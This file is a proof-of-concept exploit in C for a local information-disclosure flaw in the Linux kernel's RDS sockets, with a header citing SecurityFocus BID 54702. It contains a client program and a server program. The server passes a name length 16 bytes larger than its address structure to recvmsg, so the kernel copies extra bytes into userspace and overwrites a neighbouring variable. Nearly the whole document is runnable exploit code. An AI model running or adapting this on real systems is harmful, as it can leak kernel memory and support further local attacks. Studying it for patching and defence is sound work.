/*
source: http://www.securityfocus.com/bid/54702/info

The Linux kernel is prone to a local information-disclosure vulnerability.

Local attackers can exploit this issue to obtain sensitive information that may lead to further attacks. 
*/


/***************** rds_client.c ********************/

int main(void)
{
int sock_fd;
struct sockaddr_in serverAddr;
struct sockaddr_in toAddr;
char recvBuffer[128] = "data from client";
struct msghdr msg;
struct iovec iov;

sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);
if (sock_fd < 0) {
perror("create socket error\n");
exit(1);
}

memset(&serverAddr, 0, sizeof(serverAddr));
serverAddr.sin_family = AF_INET;
serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
serverAddr.sin_port = htons(4001);

if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
perror("bind() error\n");
close(sock_fd);
exit(1);
}

memset(&toAddr, 0, sizeof(toAddr));
toAddr.sin_family = AF_INET;
toAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
toAddr.sin_port = htons(4000);
msg.msg_name = &toAddr;
msg.msg_namelen = sizeof(toAddr);
msg.msg_iov = &iov;
msg.msg_iovlen = 1;
msg.msg_iov->iov_base = recvBuffer;
msg.msg_iov->iov_len = strlen(recvBuffer) + 1;
msg.msg_control = 0;
msg.msg_controllen = 0;
msg.msg_flags = 0;

if (sendmsg(sock_fd, &msg, 0) == -1) {
perror("sendto() error\n");
close(sock_fd);
exit(1);
}

printf("client send data:%s\n", recvBuffer);

memset(recvBuffer, '\0', 128);

msg.msg_name = &toAddr;
msg.msg_namelen = sizeof(toAddr);
msg.msg_iov = &iov;
msg.msg_iovlen = 1;
msg.msg_iov->iov_base = recvBuffer;
msg.msg_iov->iov_len = 128;
msg.msg_control = 0;
msg.msg_controllen = 0;
msg.msg_flags = 0;
if (recvmsg(sock_fd, &msg, 0) == -1) {
perror("recvmsg() error\n");
close(sock_fd);
exit(1);
}

printf("receive data from server:%s\n", recvBuffer);

close(sock_fd);

return 0;
}

/***************** rds_server.c ********************/

int main(void)
{
struct sockaddr_in fromAddr;
int sock_fd;
struct sockaddr_in serverAddr;
unsigned int addrLen;
char recvBuffer[128];
struct msghdr msg;
struct iovec iov;

sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);
if(sock_fd < 0) {
perror("create socket error\n");
exit(0);
}

memset(&serverAddr, 0, sizeof(serverAddr));
serverAddr.sin_family = AF_INET;
serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
serverAddr.sin_port = htons(4000);
if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
perror("bind error\n");
close(sock_fd);
exit(1);
}

printf("server is waiting to receive data...\n");
msg.msg_name = &fromAddr;

/*
 * I add 16 to sizeof(fromAddr), ie 32,
 * and pay attention to the definition of fromAddr,
 * recvmsg() will overwrite sock_fd,
 * since kernel will copy 32 bytes to userspace.
 *
 * If you just use sizeof(fromAddr), it works fine.
 * */
msg.msg_namelen = sizeof(fromAddr) + 16;
/* msg.msg_namelen = sizeof(fromAddr); */
msg.msg_iov = &iov;
msg.msg_iovlen = 1;
msg.msg_iov->iov_base = recvBuffer;
msg.msg_iov->iov_len = 128;
msg.msg_control = 0;
msg.msg_controllen = 0;
msg.msg_flags = 0;

while (1) {
printf("old socket fd=%d\n", sock_fd);
if (recvmsg(sock_fd, &msg, 0) == -1) {
perror("recvmsg() error\n");
close(sock_fd);
exit(1);
}
printf("server received data from client:%s\n", recvBuffer);
printf("msg.msg_namelen=%d\n", msg.msg_namelen);
printf("new socket fd=%d\n", sock_fd);
strcat(recvBuffer, "--data from server");
if (sendmsg(sock_fd, &msg, 0) == -1) {
perror("sendmsg()\n");
close(sock_fd);
exit(1);
}
}

close(sock_fd);
return 0;
}
